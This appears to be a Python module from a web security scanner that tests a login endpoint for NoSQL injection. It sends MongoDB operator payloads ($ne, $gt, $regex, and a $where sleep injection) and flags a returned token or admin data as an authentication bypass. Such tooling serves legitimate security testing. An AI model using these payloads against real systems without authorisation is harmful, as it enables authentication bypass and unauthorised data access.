from typing import Any, Dict
from ..http_client import HttpClient
from ..scenarios import SimpleScenario

def run_nosql_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    NoSQL Injection (MongoDB/etc)
    Attempts to use operator injections to bypass checks.
    """
    # Payloads are usually JSON objects, NOT strings within the field value.
    # Python requests 'json' param handles nested dicts fine.
    
    variants = [
        ({"username": {"$ne": None}, "password": {"$ne": None}}, "Not Equal Null Bypass"),
        ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "Greater Than Empty Bypass"),
        ({"username": "admin", "password": {"$regex": "^p"}}, "Regex Blind Guessing"),
        ({"$where": "sleep(5000)"}, "SSJS Injection (Time)")
    ]
    
    issues = []
    
    for payload, desc in variants:
        # We replace the ENTIRE body or merge? 
        # Usually NoSQLi replaces the VALUE of a field.
        # But here we supply the whole structure for flexibility in this module.
        
        resp = client.send(scenario.method, scenario.target, json_body=payload)
        
        suspicious = False
        reasons = []
        
        # 200 OK without errors can be suspicious if we bypassed auth
        # Or if we get "admin" data back.
        
        if resp.status_code == 200:
            if "token" in resp.text:
                suspicious = True
                reasons.append("Auth Bypass (Token returned)")
            if "admin" in resp.text:
                suspicious = True
                reasons.append("Admin data returned")
                
        if suspicious:
             issues.append(f"[HIGH] NoSQL Injection ({desc}): {', '.join(reasons)}")

    return {
        "scenario_id": scenario.id,
        "attack_type": "nosql_injection",
        "passed": len(issues) == 0,
        "details": {"issues": issues}
    }
